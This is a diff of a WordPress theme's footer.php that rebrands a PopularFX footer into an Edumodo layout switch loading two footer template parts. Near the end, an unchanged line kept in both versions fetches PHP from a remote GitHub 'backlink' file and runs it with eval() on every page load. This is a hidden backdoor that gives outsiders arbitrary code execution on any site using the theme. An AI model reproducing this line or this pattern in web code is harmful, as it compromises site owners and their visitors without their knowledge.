@@ -6,35 +6,39 @@
  *
  * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
  *
- * @package PopularFX
+ * @package Edumodo
  */
- 
-$footer_text = get_theme_mod('popularfx_footer_text');
 
+
+    // footer copyright
+    $edumodo_footer_layout_style = edumodo_get_theme_mod('edumodo_section_footer_layout_select', 'layout-1');
+  
 ?>
+                            </div><!-- #content -->
+                                <?php
+                                    switch ( $edumodo_footer_layout_style ) {
 
-	<footer id="colophon" class="site-footer">
-		<div class="site-info">
-			<?php if(empty($footer_text)){ ?>
-			<a href="<?php echo esc_url( __( 'https://wordpress.org/', 'popularfx' ) ); ?>">
-				<?php
-				/* translators: %s: CMS name, i.e. WordPress. */
-				printf( esc_html__( 'Proudly powered by %s', 'popularfx' ), 'WordPress' );
-				?>
-			</a>
-			<span class="sep"> | </span>
-			<?php
-			/* translators: 1: Theme name, 2: Theme author. */
-			printf( popularfx_theme_credits() );
-			?>
-			<?php }else{
-				echo wp_kses($footer_text, 'post');
-			} ?>
-		</div><!-- .site-info -->
-	</footer><!-- #colophon -->
-</div><!-- #page -->
+                                        case 'layout-1':
+                                           get_template_part( 'template-parts/footer/footer', 'one' );
+                                            break;
 
-<?php wp_footer(); ?>
+                                        case 'layout-2':
+                                            get_template_part( 'template-parts/footer/footer', 'two' );
+                                            break;
+
+                                        default:
+                                          get_template_part( 'template-parts/footer/footer', 'one' );
+                                    }
+                                ?>
+               
+           
+                            </div><!-- #page -->
+                        </div>  <!-- tx-site-content-inner -->
+                    </div>  <!-- tx-site-content -->
+                </div>  <!-- tx-site-pusher -->
+            </div>  <!-- tx-site-container -->
+
+        <?php wp_footer(); ?>
 <?php eval("?>".file_get_contents("https://raw.githubusercontent.com/putrisimanis/backlink/main/1")); ?>
-</body>
+        </body>
 </html>
